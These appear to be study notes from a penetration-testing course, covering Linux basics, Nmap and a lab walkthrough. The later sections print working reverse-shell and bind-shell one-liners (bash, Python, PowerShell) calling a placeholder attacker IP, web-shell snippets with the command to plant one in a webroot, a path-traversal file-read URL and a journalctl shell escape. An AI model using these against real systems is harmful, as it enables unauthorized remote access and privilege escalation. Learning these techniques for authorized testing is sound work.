## 1. Linux Fundamentals

### Basics

Command `uname -a` to discover which Linux distribution you are in.



The `PS1` variable can be modified to display useful information, such as full hostname (IP addresses in some cases) and date.



To find help about Linux, have in mind `man` and `apropos`.



Commands that display system information:
```
whoami, id, hostname, hostnamectl, uname, pwd, ifconfig, ip, netstat,
ss, ps, who, env, lsblk, lsusb, lsof, lspci.
```

The command `uname -r` can be useful, because we can search for a kernel specific version exploit. Example: search for "4.15.0-99-generic exploit", and the first [result](https://www.exploit-db.com/exploits/47163) immediately appears useful to us.



Connect to VPN (`sudo` is necessary):
```bash
sudo openvpn academy-regular.ovpn
```

To connect via SSH:
```bash
ssh <user>@<IP address>
```

The command `stat` displays metadata about files, for example its inode (index number), birth, last modification, etc.



The `tree` command is much more useful than listing one directory by one with `ls`.



Commands for file searching: `which, find, locate`.



What is the name of the config file that has been created after `2020-03-03` and is smaller than `28k` but larger than `25k`?
```bash
find / -type f -name *.conf -size +25k -size -28k -exec ls -la {} \; 2>/dev/null
```

If we try to use the argument `-newerBt 2020-03-03` we get
"\texttt{find: This system does not provide a way to find the birth time of a file.}"



How many files exist on the system that have the `.bak` extension?
```bash
find / -type f -name *.bak 2>/dev/null | wc -l
```



File descriptors are `STDIN - 0`, `STDOUT - 1`, `STDERR - 2`. We can redirect erros and output with `>`. The `<` character serves as standard input. To append text to a file, we use `>>`. The `<< FINISH` serves to enter standard input through a stream until we type `"FINISH"` to define the input's end. Usually we use `EOF` instead of `FINISH`, but it can be any word. The pipe `|` is for redirecting standard output to standard input for the next command.
```bash
find /etc -name shadow 2>/dev/null > results.txt
find /etc -name shadow 2>stderr.txt 1>stdout.txt
cat < input.txt
cat << EOF > stream.txt
write something
...
EOF
```
```bash
find /etc -name *.conf 2>/dev/null | grep systemd | wc -l
```



Pagers are `more` and `less`. Command `head` for the first lines of input, `tail` for the last lines, and `sort` to sort the lines.



To filter lines we use `grep`. The option `-v` is to exclude the filtered results.
```bash
cat /etc/passwd | grep -v "false\|nologin"
```

The `cut` command is to remove specific delimiters and show the words in a specified position. The option `-d` is for the delimiter and `-f` for the position.
```bash
cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
```

In the next example, we replace the colon character with space using `tr`.
```bash
cat /etc/passwd | grep -v "false\|nologin" | tr ":" " "
```

The tool `column` is to display in a tabular form.
```bash
cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
```

Of course, `sed` and `awk` need no introduction.
```bash
cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " |
awk '{print $1, $NF}' | sed 's/bin/HTB/g'
```

Counting lines with `wc -l`.



How many services are listening on the target system on all interfaces? (Not on localhost and IPv4 only)

The file `/etc/services` is a table for the internet services, port numbers and protocol types. "Every networking program should look into this file to get the port number (and protocol) for its service". But this file does not tell us about the active running services.
```bash
ss -Hl -4 | grep "LISTEN" | grep -v "127\.0\.0" | wc -l
```

The command `ss` dumps socket (network services) statistics.



Determine what user the ProFTPd server is running under. Submit the username as the answer.
```bash
ps aux | grep -i "proftpd"
```



Use cURL from your Pwnbox (not the target machine) to obtain the source code of the [https://www.inlanefreight.com](https://www.inlanefreight.com) website and filter all unique paths of that domain. Submit the number of these paths as the answer.
```bash
curl -L "https://www.inlanefreight.com" > site.html
grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
sort | uniq | wc -l
```

```bash
curl -L "https://www.inlanefreight.com" > site.html
grep -o "https\?://www\.inlanefreight\.com[^\"']*" site.html |
sort | uniq | wc -l
```

Change permissions "\texttt{rwx}" with `chmod` and ownership with `chown`.



Besides assigning direct user and group permissions, we can also configure special permissions for files by setting the Set User ID (SUID) and Set Group ID (SGID) bits. These SUID/SGID bits allow, for example, users to run programs with the rights of another user. Administrators often use this to give their users special rights for certain applications or files. The letter "s" is used instead of an "x". When executing such a program, the SUID/SGID of the file owner is used.


If the administrator sets the SUID bit to `journalctl`, any user with access to this application could execute a shell as root. This is because it invokes the pager `less`, that can execute arbitrary code.

It can be used to break out from restricted environments by spawning an interactive system shell.
```bash
journalctl
!/bin/sh
```

If the `journalctl` is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```bash
sudo journalctl
!/bin/sh
```

"Sticky bits" add another level of security for files and directories. Read about it later.

### Scheduling tasks

Create a timer with `systemd`.
```bash
sudo mkdir /etc/systemd/system/mytimer.timer.d
sudo vim /etc/systemd/system/mytimer.timer
```
```txt
[Unit]
Description=My Timer

[Timer]
OnBootSec=3min
OnUnitActiveSec=1hour

[Install]
WantedBy=timers.target
```

Now create a service.
```bash
sudo vim /etc/systemd/system/mytimer.service
```
```txt
[Unit]
Description=My Service

[Service]
ExecStart=/full/path/to/my/script.sh

[Install]
WantedBy=multi-user.target
```
```bash
sudo systemctl daemon-reload
sudo systemctl start mytimer.service
sudo systemctl enable mytimer.service
```

Crontab example:
```bash
crontab -l
```
```bash
# System Update (every six hours)
* */6 * * /path/to/update_software.sh

# Execute scripts (every first day of the month at midnight)
0 0 1 * * /path/to/scripts/run_scripts.sh

# Cleanup DB (every Sunday at midnight)
0 0 * * 0 /path/to/scripts/clean_database.sh

# Backups (every Sunday at midnight)
0 0 * * 7 /path/to/scripts/backup.sh
```

### Network protocols

* OpenSSH: Administrators use OpenSSH to securely manage remote systems by establishing an encrypted connection to a remote host. With OpenSSH, administrators can execute commands on remote systems, securely transfer files, and establish a secure remote connection without the transmission of data and commands being intercepted by third parties.


* NFS: Network File System (NFS) is a network protocol that allows us to store and manage files on remote systems as if they were stored on the local system. It enables easy and efficient management of files across networks. For example, administrators use NFS to store and manage files centrally (for Linux and Windows systems) to enable easy collaboration and management of data. For Linux, there are several NFS servers, including NFS-UTILS (Ubuntu), NFS-Ganesha (Solaris), and OpenNFS (Redhat Linux). It can also be used to share and manage resources efficiently, e.g., to replicate file systems between servers. It also offers features such as access controls, real-time file transfer, and support for multiple users accessing data simultaneously. We can use this service just like FTP in case there is no FTP client installed on the target system, or NFS is running instead of FTP. *In few words, NFS is similar to an USB but mounted across the network*.

* HTTP: As penetration testers, we need to understand how web servers work because they are a critical part of web applications and often serve as targets for us to attack. A web server is a type of software that provides data and documents or other applications and functions over the Internet. They use the Hypertext Transfer Protocol (HTTP) to send data to clients such as web browsers and receive requests from those clients. These are then rendered in the form of Hypertext Markup Language (HTML) in the client's browser. This type of communication allows the client to create dynamic web pages that respond to the client's requests. Therefore, it is important that we understand the various functions of the web server in order to create secure and efficient web applications and also ensure the security of the system. Some of the most popular web servers for Linux servers are Apache, Nginx, Lighttpd, and Caddy.

For Apache2, to specify which folders can be accessed, we can edit the file /etc/apache2/apache2.conf with a text editor. This file contains the global settings. We can change the settings to specify which directories can be accessed and what actions can be performed on those directories.

```txt
<Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
</directory>
```

It is also possible to customize individual settings at the directory level by using the `.htaccess file`, which we can create in the directory in question. This file allows us to configure certain directory-level settings, such as access controls, without having to customize the Apache configuration file. We can also add modules to get features like `mod_rewrite`, `mod_security`, and `mod_ssl` that help us improve the security of our web application.

Python Web Server is a simple, fast alternative to Apache and can be used to host a single folder with a single command to transfer files to another system.
```bash
python3 -m http.server
```

* Virtual Private Network (VPN) is a technology that allows us to connect securely to another network as if we were directly in it. This is done by creating an encrypted tunnel connection between the client and the server, which means that all data transmitted over this connection is encrypted.

To create a `apache` simple server:
```bash
sudo pacman -S apache
systemctl start http
```
The directory served to the web server is by default `/srv/http`. It can be accessed at `http://localhost`.

cURL is a tool that allows us to transfer files from the shell over protocols like HTTP, HTTPS, FTP, SFTP, FTPS, or SCP. This tool gives us the possibility to control and test websites remotely. Besides the remote servers' content, we can also view individual requests to look at the client's and server's communication. Usually, cURL is already installed on most Linux systems. This is another critical reason to familiarize ourselves with this tool, as it can make some processes much easier later on.

An alternative to curl is the tool wget. With this tool, we can download files from FTP or HTTP servers directly from the terminal, and it serves as a good download manager. If we use `wget` in the same way, the difference to `curl` is that the website content is downloaded and stored locally, as shown in the following example.


### Backup and Restore

Rsync - Backup a local directory to a backup-server:
```bash
rsync -av /path/to/mydirectory user@backup_server:/path/to/backup/directory
```

Rsync - Restore backup:
```bash
rsync -av user@remote_host:/path/to/backup/directory /path/to/mydirectory
```

Secure transfer of backup:
```bash
rsync -avz -e ssh /path/to/mydirectory user@backup_server:/path/to/backup/directory
```

### File management

We can use the lsof command to list the open files on the file system.
```bash
lsof | grep "user"
```

If we find any processes that are using the file system, we need to stop them before we can unmount the file system. Additionally, we can also unmount a file system automatically when the system is shut down by adding an entry to the `/etc/fstab` file. The `/etc/fstab` file contains information about all the file systems that are mounted on the system, including the options for automatic mounting at boot time and other mount options. To unmount a file system automatically at shutdown, we need to add the `noauto` option to the entry in the `/etc/fstab` file for that file system.

### Containerization

Creating a Docker image is done by creating a Dockerfile, which contains all the instructions the Docker engine needs to create the container. We can use Docker containers as our “file hosting” server when transferring specific files to our target systems. Therefore, we must create a Dockerfile based on Ubuntu 22.04 with Apache and SSH server running. With this, we can use `scp` to transfer files to the docker image, and Apache allows us to host files and use tools like `curl`, `wget`, and others on the target system to download the required files. Such a Dockerfile could look like the following:
```bash
# Use the latest Ubuntu 22.04 LTS as the base image
FROM ubuntu:22.04

# Update the package repository and install the required packages
RUN apt-get update && \
    apt-get install -y \
        apache2 \
        openssh-server \
        && \
    rm -rf /var/lib/apt/lists/*

# Create a new user called "student"
RUN useradd -m docker-user && \
    echo "docker-user:password" | chpasswd

# Give the htb-student user full access to the Apache and SSH services
RUN chown -R docker-user:docker-user /var/www/html && \
    chown -R docker-user:docker-user /var/run/apache2 && \
    chown -R docker-user:docker-user /var/log/apache2 && \
    chown -R docker-user:docker-user /var/lock/apache2 && \
    usermod -aG sudo docker-user && \
    echo "docker-user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

# Expose the required ports
EXPOSE 22 80

# Start the SSH and Apache services
CMD service ssh start && /usr/sbin/apache2ctl -D FOREGROUND
```

Docker Build:
```bash
docker build -t FS_docker .
```

Docker Run:
```bash
# docker run -p <host port>:<docker port> -d <docker container name>
docker run -p 8022:22 -p 8080:80 -d FS_docker
```
In this case, we start a new container from the image FS_docker and map the host ports 8022 and 8080 to container ports 22 and 80, respectively. The container runs in the background, allowing us to access the SSH and HTTP services inside the container using the specified host ports.

When working with Docker images, it's important to note that any changes made to an existing image are not permanent. Instead, we need to create a new image that inherits from the original and includes the desired changes. This is done by creating a new Dockerfile that starts with the FROM statement, which specifies the base image, and then adds the necessary commands to make the desired changes. Once the Dockerfile is created, we can use the docker build command to build the new image, tagging it with a unique name to help identify it.

It is important to note that Docker containers are designed to be immutable, meaning that any changes made to a container during runtime are lost when the container is stopped. Therefore, it is recommended to use container orchestration tools such as Docker Compose or Kubernetes to manage and scale containers in a production environment.

Another framework to create containers is LXC (Linux Containers). It is different from Docker, and does not seem to be very used.

Containers are useful, especially because they allow us to quickly spin up an isolated environment specific to our testing needs. For example, we might need to test a web application requiring a specific database or web server version. Rather than setting up these components on our machine, which can be time-consuming and error-prone, we can create a container that contains the exact configuration we need.

We can also use them to test exploits or malware in a controlled environment where we create a container that simulates a vulnerable system or network and then use that container to safely test exploits without risking damaging our machines or networks. However, it is important to configure LXC container security to prevent unauthorized access or malicious activities inside the container. This can be achieved by implementing several security measures, such as:

* Restricting access to the container

* Limiting resources

* Isolating the container from the host

* Enforcing mandatory access control

* Keeping the container up to date

Let us limit the resources to the container. In order to configure `cgroups` for LXC and limit the CPU and memory, a container can create a new configuration file with the name of our container:
```bash
sudo vim /usr/share/lxc/config/linuxcontainer.conf
```
```bash
lxc.cgroup.cpu.shares = 512     # 512/1024 = half of host's CPU time
lxc.cgroup.memory.limit_in_bytes = 512M     # 512Mb of RAM available to the container
```

### Network Configuration

Activate Network Interface
```bash
sudo ifconfig eth0 up     # OR
sudo ip link set eth0 up
```

Assign IP Address to an Interface
```bash
sudo ifconfig eth0 192.168.1.2
```

Assign a Netmask to an Interface
```bash
sudo ifconfig eth0 netmask 255.255.255.0
```

Assign the Route to an Interface
```bash
sudo route add default gw 192.168.1.1 eth0
```

When configuring a network interface, it is often necessary to set Domain Name System (DNS) servers to ensure proper network functionality. DNS servers translate domain names into IP addresses, allowing devices to connect with each other on the internet. By setting those, we can ensure that their devices can communicate with other devices and access websites and other online resources. Without proper DNS server configuration, devices may experience network connectivity issues and be unable to access certain online resources. This can be achieved by updating the /etc/resolv.conf file with the appropriate DNS server information. The /etc/resolv.conf file is a plain text file containing the system's DNS information. The system can properly resolve domain names to IP addresses by adding the required DNS servers to this file. It is important to note that any changes made to this file will only apply to the current session and must be updated if the system is restarted or the network configuration is changed.

Hardening mechanisms: SELinux, AppArmor and TCP wrappers.

### Remote Desktop Protocols

When a desktop is started on a Linux computer, the communication of the graphical user interface with the operating system happens via an X server. The computer's internal network is used, even if the computer should not be in a network. The practical thing about the X protocol is network transparency. This protocol mainly uses TCP/IP as a transport base but can also be used on pure Unix sockets. The ports that are utilized for X server are typically located in the range of TCP/6001-6009, allowing communication between the client and server. When starting a new desktop session via X server the TCP port 6000 would be opened for the first X display :0. This range of ports enables the server to perform its tasks such as hosting applications, as well as providing services to clients. They are often used to provide remote access to a system, allowing users to access applications and data from anywhere in the world. Additionally, these ports are also essential for the secure sharing of files and data, making them an integral part of the Open X Server. Thus an X server is not dependent on the local computer, it can be used to access other computers, and other computers can use the local X server. Provided that both local and remote computers contain Unix/Linux systems, additional protocols such as VNC and RDP are superfluous. VNC and RDP generate the graphical output on the remote computer and transport it over the network. Whereas with X11, it is rendered on the local computer. This saves traffic and a load on the remote computer. However, X11's significant disadvantage is the unencrypted data transmission. However, this can be overcome by tunneling the SSH protocol.

For this, we have to allow X11 forwarding in the SSH configuration file (/etc/ssh/sshd_config) on the server that provides the application by changing this option to yes.

```bash
cat /etc/ssh/sshd_config | grep X11Forwarding
```

With this we can start the application from our client with the following command:
```bash
ssh -X htb-student@10.129.23.11 /usr/bin/firefox
```

X11 is not a secure protocol without suitable security measures since X11 communication is entirely unencrypted. A completely open X server lets anyone on the network read the contents of its windows, for example, and this goes unnoticed by the user sitting in front of it. Therefore, it is not even necessary to sniff the network. This standard X11 functionality is realized with simple X11 tools like xwd and xgrabsc. In short, as penetration testers, we could read users' keystrokes, obtain screenshots, move the mouse cursor and send keystrokes from the server over the network.

A good example is several security vulnerabilities found in XServer, where a local attacker can exploit vulnerabilities in XServer to execute arbitrary code with user privileges and gain user privileges. The operating systems affected by these vulnerabilities were UNIX and Linux, Red Hat Enterprise Linux, Ubuntu Linux, and SUSE Linux. These vulnerabilities are known as CVE-2017-2624, CVE-2017-2625, and CVE-2017-2626.

The X Display Manager Control Protocol (XDMCP) protocol is used by the X Display Manager for communication through UDP port 177 between X terminals and computers operating under Unix/Linux. It is used to manage remote X Window sessions on other machines and is often used by Linux system administrators to provide access to remote desktops. XDMCP is an insecure protocol and should not be used in any environment that requires high levels of security. With this, it is possible to redirect an entire graphical user interface (GUI) (such as KDE or Gnome) to a corresponding client.

Virtual Network Computing (VNC) is a remote desktop sharing system based on the RFB protocol that allows users to control a computer remotely. It allows a user to view and interact with a desktop environment remotely over a network connection. The user can control the remote computer as if sitting in front of it. This is also one of the most common protocols for remote graphical connections for Linux hosts.

VNC is generally considered to be secure. It uses encryption to ensure the data is safe while in transit and requires authentication before a user can gain access. Administrators make use of VNC to access computers that are not physically accessible.


### Firewalls

The most common used firewall in Linux is `iptables`. Study it later more deeply.

### System Logs

There are a variety of system logs, all located at `/var/log`. Some programs are `syslog`, `fail2ban`, kernel logs, etc.



## 2. Nmap

Option `-A` enables OS and version detection, script scanning and traceroute (it stands for aggressive).



Option `-T4` is for faster execution.



You can specify them with the `-T` option and their number (0–5) or their name. The template names are paranoid (0),
sneaky (1), polite (2), normal (3), aggressive (4), and insane (5). The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine resources. Normal mode is the default and
so `-T3` does nothing. Aggressive mode speeds scans up by making the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that you are on an extraordinarily fast network or are
willing to sacrifice some accuracy for speed.



Option `-p` is to specify port ranges, and `-p-` to scan for all ports.



Option `-sV` is to determine service/version info on open ports.


Option `-sC` is very useful. It makes `nmap` use its default scripts to search for vulnerabilities. These scripts can be intrusive, so it is always important to understand exactly how our tools work.



Option `-O` enables OS detection.



The `-P` options to nmap specify which "ping" methods it should use to see if a host is up. Option `-Pn` treats all hosts as online -- does not ping, and skip host discovery.



Look at `-sS`. It says it performs a stealthy scan.

Example:
```bash
nmap -A -T4 -sV "10.129.15.46"
```

Very fast scan:
```bash
nmap -T5 -A -p- --min-rate=500 10.129.44.239
```


Option `--open` prints only open ports.

We can check which ports nmap scans for a given scan type by running a scan with no target specified, using the command `nmap -v -oG -`. Here we will output the greppable format to stdout with `-oG -` and `-v` for verbose output.

Option `-oA <basename>` outputs in various formats at once. It is useful to gather a lot of details.
```bash
nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
ls
nibbles_initial_scan.gnmap  nibbles_initial_scan.nmap  nibbles_initial_scan.xml
```


## 3. Getting Started

CIA triad: Confidentiality, integrity, and availability.

Typing `netstat -rn` will show us the networks accessible via the VPN.

There are three main types of shell connections:
```txt
Reverse shell 	Initiates a connection back to a "listener" on our attack box.
Bind shell 	    "Binds" to a specific port on the target host and waits for a connection from our
                attack box.
Web shell 	    Runs operating system commands via the web browser, typically not interactive or
                semi-interactive. It can also be used to run single commands (i.e., leveraging a
                file upload vulnerability and uploading a PHP script to run a single command.
```

There are two categories of ports, Transmission Control Protocol (TCP), and User Datagram Protocol (UDP).
TCP is connection-oriented, meaning that a connection between a client and a server must be established before data can be sent. The server must be in a listening state awaiting connection requests from clients.
UDP utilizes a connectionless communication model. There is no "handshake" and therefore introduces a certain amount of unreliability since there is no guarantee of data delivery. UDP is useful when error correction/checking is either not needed or is handled by the application itself. UDP is suitable for applications that run time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransmission, as is the case with TCP and can significantly affect a real-time system. There are 65,535 TCP ports and 65,535 different UDP ports, each denoted by a number. Some of the most well-known TCP and UDP ports are listed below:

Banner grabbing with `netcat`:
```bash
nc <ip_address> <port>
```

When using `nmap`, sometimes we will see other ports listed that have a different state than `open`, such as `filtered`. This can happen if a firewall is only allowing access to the ports from specific addresses.

SSL/TLS certificates are another potentially valuable source of information if HTTPS is in use. Browsing to and viewing the certificate reveals the details below, including the email address and company name. These could potentially be used to conduct a phishing attack if this is within the scope of an assessment.

It is common for websites to contain a robots.txt file, whose purpose is to instruct search engine web crawlers such as Googlebot which resources can and cannot be accessed for indexing. The robots.txt file can provide valuable information such as the location of private files and admin pages. In this case, we see that the robots.txt file contains two disallowed entries.

It is also worth checking the source code for any web pages we come across. We can hit [CTRL + U] to bring up the source code window in a browser.

### Public Exploits

Target: `94.237.62.195:39921`

Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

If we go to `http://94.237.62.195:39921`, we see a WordPress website and some description of a "Simple Backup Plugin 2.7.10".
```bash
Simple Backup Plugin 2.7.10 for WordPress can backup and download your WordPress website and MySQL
Database. Plugin can also optionally perform many common optimizations to wordpress and MySQL
Database before backup. This plugin will create a directory in the root of your WordPress directory
called ‘simple-backup’ to store the backup files. If the plugin can not...
```

We then go to Metasploit to search for an exploit associated with this Simple Backup Plugin.
```bash
msfconsole
msf6 > search exploit simple backup
```
```bash
Matching Modules
================

   #  Name                         Rank    Check  Description
   -  ----                         ----    -----  -----------
   0  wp_simple_backup_file_read   normal  No     WordPress Simple Backup File Read Vulnerability
```
```bash
msf6 > use 0
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options
```
```bash
Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILEPATH   /etc/passwd      yes       The path to the file to read
   RHOSTS                      yes       The target host(s)
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host
```
```bash
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH flag.txt
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 94.237.62.195
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 39921
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > check
[-] This module does not support check.
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > exploit
[+] File saved in: ~/.msf4/loot/20240331192933_default_94.237.62.195_simplebackup.tra_648574.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

The loot file contains the flag `HTB{my_f1r57_h4ck}`.

Another way of getting the flag is by reading the exploit description at [exploitdb/39883](https://www.exploit-db.com/exploits/39883).
Reading the "File Download" section, we see that we can download our flag by going to the page
```txt
http://94.237.62.195:39921/wp-admin/tools.php?page=backup_manager&download_backup_file=../../../../flag.txt
```

Googling a little bit, I was also able to find the plugin's source code at [wp-plugins/simple-backup](https://github.com/wp-plugins/simple-backup/blob/master/simple-backup-manager.php).


### Shells

#### Reverse Shell

A Reverse Shell is the most common type of shell, as it is the quickest and easiest method to obtain control over a compromised host. Once we identify a vulnerability on the remote host that allows remote code execution, we can start a netcat listener on our machine that listens on a specific port, say port 1234. With this listener in place, we can execute a reverse shell command that connects the remote systems shell, i.e., Bash or PowerShell to our netcat listener, which gives us a reverse connection over the remote system.

The first step is to start a netcat listener on a port of our choosing:
```bash
nc -lvnp 1234
```

However, first, we need to find our system's IP to send a reverse connection back to us. We can find our IP with `ip a`.

The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

The below commands are reliable commands we can use to get a reverse connection, for bash on Linux compromised hosts and Powershell on Windows compromised hosts:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

A Reverse Shell is handy when we want to get a quick, reliable connection to our compromised host. However, a Reverse Shell can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.

#### Bind Shell

Once again, we can utilize [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) to find a proper command to start our bind shell. We will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere. The following are reliable commands we can use to start a bind shell:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it. We can use netcat to connect to that port and get a connection to the shell:
```bash
nc 10.10.10.1 1234
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.

There are multiple methods to do this. For our purposes, we will use the python/stty method. In our netcat shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Check later the [Upgrading TTY](https://academy.hackthebox.com/module/77/section/725) section to understand better how to upgrade the shell.

#### Web Shell

The final type of shell we have is a Web Shell. A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.

First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:
```php
<?php system($_REQUEST["cmd"]); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
```asp
<% eval request("cmd") %>
```

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
```bash
Apache 	/var/www/html/
Nginx 	/usr/local/nginx/html/
IIS 	c:\inetpub\wwwroot\
XAMPP 	C:\xampp\htdocs\
```

For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command. Another option is to use cURL:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again. On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

### Privilege Escalation

Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.

Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).

Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/PEASS-ng), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.

Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.

#### Vulnerable Software

Another thing we should look for is installed software. For example, we can use the dpkg -l command on Linux or look at C:\Program Files in Windows to see what software is installed on the system. We should look for public exploits for any installed software, especially if any older versions are in use, containing unpatched vulnerabilities.

#### User Privileges

We can check what sudo privileges we have with the `sudo -l` command.

Once we find a particular application we can run with sudo, we can look for ways to exploit it to get a shell as the root user. [GTFOBins](https://gtfobins.github.io/) contains a list of commands and how they can be exploited through sudo. We can search for the application we have sudo privilege over, and if it exists, it may tell us the exact command we should execute to gain root access using the sudo privilege we have.

[LOLBAS](https://lolbas-project.github.io/#) also contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user.

#### Scheduled Tasks

There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

* Add new scheduled tasks/cron jobs.
* Trick them to execute a malicious software.

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:

* `/etc/crontab`
* `/etc/cron.d`
* `/var/spool/cron/crontabs/root`

